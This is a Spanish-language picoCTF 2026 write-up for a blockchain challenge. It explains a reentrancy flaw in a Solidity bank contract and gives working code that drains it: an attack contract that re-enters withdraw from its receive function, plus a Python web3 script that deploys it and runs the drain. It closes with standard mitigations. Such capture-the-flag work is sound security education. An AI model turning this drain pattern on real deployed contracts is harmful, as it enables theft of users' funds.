# Blockchain — Reentrance

## Descripción
> **Prompt oficial del reto:** "The lead developer at SecureBank Corp is back, and he's doubling down. After the last 'incident,' he claims he's patched the vault and created the ultimate, unhackable Ethereum contract. He’s so confident, he’s explicitly taunting the security team to try and break it. He says, 'I've added the checks, I've added the balances. There is no way you can withdraw more than you own.' Your mission: Wipe the smile off his face. Drain the vault down to 0 and force the contract to surrender the flag."
>
> **Pistas oficiales:**
> 1. If a bank hands you cash *before* they update your account balance in their ledger, what is to stop you from getting back in line immediately?
> 2. If the recipient is another contract, what function is triggered when it receives Ether?

- **Categoría:** Blockchain
- **Dificultad:** Hard
- **Evento/origen:** picoCTF 2026
- **Autor:** OB

## Solución
El reto presenta un contrato bancario vulnerable en Solidity `^0.6.12` denominado `VulnBank.sol`. La vulnerabilidad corresponde al patrón clásico de **Reentrancy** (idéntico al ataque a The DAO en 2016), en el cual el contrato realiza una llamada externa con transferencia de Ether antes de actualizar el saldo contable interno del remitente.

### 1. Análisis del contrato vulnerable
Al inspeccionar `VulnBank.sol`:

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount, "Insufficient funds available");

    (bool sent, ) = msg.sender.call{value: amount}("");
    balances[msg.sender] -= amount;

    require(sent, "Transfer failed");

    if (!revealed && address(this).balance == 0) {
        revealed = true;
        emit FlagRevealed(flag);
    }
}
```

Puntos clave:
1. La función `withdraw(uint amount)` verifica inicialmente que `balances[msg.sender] >= amount`.
2. A continuación ejecuta `(bool sent, ) = msg.sender.call{value: amount}("")`.
3. Si el receptor `msg.sender` es un contrato malicioso, la recepción del Ether transfiere el control de ejecución a su función `receive()` o `fallback()`.
4. En ese momento, la línea `balances[msg.sender] -= amount` aún no se ha ejecutado en `VulnBank`. Por lo tanto, el saldo contable del atacante permanece intacto.
5. El contrato atacante puede volver a invocar `withdraw(amount)` de forma recursiva (reentrante), repitiendo el proceso hasta drenar completamente el saldo del banco.
6. En Solidity 0.6.12 no hay verificaciones automáticas de desbordamiento/subdesbordamiento aritmético, por lo que la posterior actualización `balances[msg.sender] -= amount` simplemente produce un subdesbordamiento (*underflow*) sin revertir la transacción.
7. Cuando el saldo de `VulnBank` llega exactamente a cero (`address(this).balance == 0`), el condicional activa `revealed = true` y emite el evento `FlagRevealed(flag)`, permitiendo consultar `getFlag()`.

### 2. Contrato de explotación (Attack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function getFlag() external view returns (string memory);
}

contract Attack {
    IVulnBank public target;
    address public owner;

    constructor(address _target) {
        target = IVulnBank(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ether");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }

    function getFlag() external view returns (string memory) {
        return target.getFlag();
    }
}
```

### 3. Script de despliegue y explotación en Python

```python
import solcx
from web3 import Web3

# Compilar contrato atacante
solcx.set_solc_version("0.8.20")
compiled = solcx.compile_source(ATTACK_SOL_CODE, output_values=["abi", "bin"])
contract_interface = compiled["<stdin>:Attack"]

# Conexión RPC y credenciales
w3 = Web3(Web3.HTTPProvider("http://<rpc_host>:<rpc_port>"))
bank_addr = "0x..."
player_priv = "0x..."
player_addr = "0x..."

# Desplegar contrato Attack
Attack = w3.eth.contract(abi=contract_interface["abi"], bytecode=contract_interface["bin"])
nonce = w3.eth.get_transaction_count(player_addr)
tx = Attack.constructor(bank_addr).build_transaction({
    "from": player_addr,
    "nonce": nonce,
    "gas": 1500000,
    "gasPrice": w3.to_wei("5", "gwei"),
})
signed = w3.eth.account.sign_transaction(tx, private_key=player_priv)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
attack_contract = w3.eth.contract(address=receipt.contractAddress, abi=contract_interface["abi"])

# Iniciar ataque depositando 1 ETH y drenando los 10 ETH del banco
nonce = w3.eth.get_transaction_count(player_addr)
tx = attack_contract.functions.attack().build_transaction({
    "from": player_addr,
    "value": w3.to_wei(1, "ether"),
    "nonce": nonce,
    "gas": 3000000,
    "gasPrice": w3.to_wei("5", "gwei"),
})
signed = w3.eth.account.sign_transaction(tx, private_key=player_priv)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash)

# Obtener bandera
flag = attack_contract.functions.getFlag().call()
print("Flag:", flag)
```

## Notas adicionales
- La mitigación canónica contra ataques de reentrancia sigue el patrón **Checks-Effects-Interactions**:
  1. **Checks:** Validar balances y requerimientos iniciales.
  2. **Effects:** Actualizar el estado interno del contrato (modificar saldos contables) *antes* de realizar cualquier llamada externa.
  3. **Interactions:** Realizar las transferencias o llamadas externas al final.
- Adicionalmente, el uso de modificadores `nonReentrant` de OpenZeppelin (`ReentrancyGuard`) bloquea llamadas anidadas concurrentes.

## Referencias
- Reto: https://learn.cylabacademy.org/library/753
- SWC-107 (Reentrancy): https://swcregistry.io/docs/SWC-107
- OpenZeppelin ReentrancyGuard: https://docs.openzeppelin.com/contracts/5.x/api/utils#ReentrancyGuard
